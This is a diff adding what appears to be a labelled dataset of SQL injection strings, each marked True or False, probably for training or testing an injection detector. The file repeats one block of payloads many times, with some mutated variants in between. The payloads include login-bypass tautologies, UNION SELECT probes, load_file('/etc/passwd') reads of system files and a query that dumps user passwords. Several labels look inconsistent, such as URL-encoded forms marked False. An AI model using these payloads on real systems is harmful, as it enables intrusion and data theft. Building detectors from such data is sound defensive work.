@@ -1,0 +1,900 @@
+'||(elt(-3+5,bin(15),ord(10),hex(char(45)))) - True
+||6 - False
+'||'6 - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+'||(elt(-3+5,bin(),ord(10),hex((45)))) - True
+'#||(elt(-3+5,bin(15),ord(10),hex(char(45)))) - True
+'||((-3+5,bin(15),ord(10),hex(char(45)))) - True
+'||((-3+5,bin(15),ord(10),hex(char(45)))) - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6||6 - False
+||6 - False
+ - False
+ - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+||'6 - True
+'||'6' - True
+')EXEC XP_;--ANDDESC usersOR||'6 - True
+')EXEC XP_;--ANDDESC usersOR||'6 - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+(||6()) - False
+||6) - False
+(||6 - False
+(||6 - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+'--OROR= OROR 1111=1--OROR' - True
+' OR' 11='----'1----' - True
+'OR111 OR11' 1=1--'' - True
+'OR111 OR11' 1=1--'' - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+OR 11 - False
+OR 1=;"AND)'/*DESC users,`1 - True
+OR 1=#1 - False
+OR 1=#1 - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+ OR '1'='1 - True
+'  '''1 - False
+'  '''1 - False
+'  '''1 - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+; OR '1'=/*'1' - True
+; OR '1=OR;'='1' - True
+; OR ''='1' - True
+; OR ''='1' - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+%22++or%22++isnull%281%2F0%29+%2F*%22+ - False
+%22or+isnull%281%2F0%29+%2F* - False
+%22isnull%281%2F0%29%2F*+or+isnull%281%2F0%29%2F*+%2F* - False
+%22isnull%281%2F0%29%2F*+or+isnull%281%2F0%29%2F*+%2F* - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+%27+)#=,;UNIONOR+%277659%27%3D%277659 - False
+%27+,OR+%277659%27%3D%277659 - False
+%27+--UNIONOR+%277659%27%3D%277659 - False
+%27+--UNIONOR+%277659%27%3D%277659 - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+%22+"#or+isnull%281%2F0%29+%2F* - False
+%22+AND"#'OR)=UNIONEXEC XP_or+isnull%281%2F0%29+%2F* - True
+%22or+isnull%281%2F0%29+%2F* - False
+%22or+isnull%281%2F0%29+%2F* - False
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+%27+--%27--+--+ - False
+++ - False
+%27+')--/*+ - True
+%27+')--/*+ - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
+' or username like char(37); - True
+' union select * from users where login = char(114,111,111,116); - True
+' union select - True
+Password:*/=1-- - False
+UNI/**/ON SEL/**/ECT - False
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER' - True
+'; EXEC ('SEL' + 'ECT US' + 'ER') - True
+'/**/OR/**/1/**/=/**/1 - True
+' or 1/* - True
++or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+&password= - False
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > - True
+ @var select @var as var into temp end -- - False
+' and 1 in (select var from temp)-- - True
+' union select 1,load_file('/etc/passwd'),1,1,1; - True
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1; - False
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); - True
+' or 11-- - True
+' or 1=/*1-- - True
+'+ or 1=1-- - True
+'+ or 1=1-- - True
+(||6) - False
+' OR 1=1-- - True
+OR 1=1 - False
+' OR '1'='1 - True
+; OR '1'='1' - True
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+OR+%277659%27%3D%277659 - False
+%22+or+isnull%281%2F0%29+%2F* - False
+%27+--+ - False
+' or 1=1-- - True
+" or 1=1-- - False
+' or 1=1 /* - True
+or 1=1-- - False
+' or 'a'='a - True
+" or "a"="a - False
+') or ('a'='a - True
+Admin' OR ' - True
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES-- - True
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES; - False
+' having 1=1-- - True
+' having 1=1-- - True
+' group by userid having 1=1-- - True
+' or 1 in (select @@version)-- - True
+' union all select @@version-- - True
+' OR 'unusual' = 'unusual' - True
+' OR 'something' = 'some'+'thing' - True
+' OR 'text' = N'text' - True
+' OR 'something' like 'some%' - True
+' OR 2 > 1 - True
+' OR 'text' > 't' - True
+' OR 'whatever' in ('whatever') - True
+' OR 2 BETWEEN 1 and 3 - True
